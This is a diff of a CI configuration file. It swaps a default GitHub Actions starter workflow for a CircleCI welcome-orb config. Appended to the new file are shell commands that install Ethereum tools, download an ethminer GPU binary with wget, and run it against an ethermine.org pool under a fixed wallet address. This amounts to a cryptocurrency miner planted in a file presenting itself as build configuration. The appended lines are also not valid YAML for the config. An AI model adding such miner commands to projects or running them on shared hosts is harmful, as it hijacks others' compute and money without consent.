@@ -1,36 +1,22 @@
-# This is a basic workflow to help you get started with Actions
+# Use the latest 2.1 version of CircleCI pipeline process engine. See: https://circleci.com/docs/2.0/configuration-reference
+version: 2.1
+# Use a package of configuration called an orb.
+orbs:
+  # Declare a dependency on the welcome-orb
+  welcome: circleci/welcome-orb@0.4.1
+# Orchestrate or schedule a set of jobs
+workflows:
+  # Name the workflow "welcome"
+  welcome:
+    # Run the welcome/run job in its own container
+    jobs:
+      - welcome/run
 
-name: CI
-
-# Controls when the workflow will run
-on:
-  # Triggers the workflow on push or pull request events but only for the main branch
-  push:
-    branches: [ main ]
-  pull_request:
-    branches: [ main ]
-
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
-
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
-jobs:
-  # This workflow contains a single job called "build"
-  build:
-    # The type of runner that the job will run on
-    runs-on: ubuntu-latest
-
-    # Steps represent a sequence of tasks that will be executed as part of the job
-    steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      - uses: actions/checkout@v2
-
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: echo Hello, world!
-
-      # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
-        run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+! nvidia-smi
+! sudo apt update
+! sudo add-apt-repository --yes ppa:ethereum/ethereum -y
+! sudo apt update
+! sudo apt install ethereum
+! wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+! tar -xvf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+! bin/ethminer -G -P stratum1+tcp://0xF368a8d4F88E4B857c3A1f80f957874522226c42.tes1@asia1.ethermine.org:44442$3
